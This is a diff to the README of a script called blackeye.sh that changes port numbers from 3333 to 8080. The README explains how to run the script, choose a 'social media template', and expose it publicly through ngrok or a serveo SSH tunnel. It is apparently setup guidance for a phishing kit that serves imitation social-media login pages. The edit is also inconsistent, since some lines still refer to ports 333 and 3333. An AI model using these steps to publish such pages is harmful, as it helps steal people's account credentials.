@@ -26,20 +26,20 @@ It has a shell script, just execute it by
 bash blackeye.sh
 ```
 Now you have lots of social media template, choose whatever you want
-After running, browse [http://localhost:333](localhost:333)
+After running, browse [http://localhost:8080](localhost:333)
 
 and if you want to access from outside of your localhost, forward your localhost port 3333
 In this case you can use ngrok or serveo or any port forwarding services.
 ##### ngrok
 ```
-ngrok http 3333
+ngrok http 8080
 
 ```
 
 It will provide you a link, link look like, ``` http://isgskshsks.ngrok``` but not this one.
 
 ##### Serveo
-```ssh -R custom_name:80:localhost:3333 serveo.net```
+```ssh -R custom_name:80:localhost:8080 serveo.net```
 
 it will provide you a link , something like https://custom_name.serveo.net
 
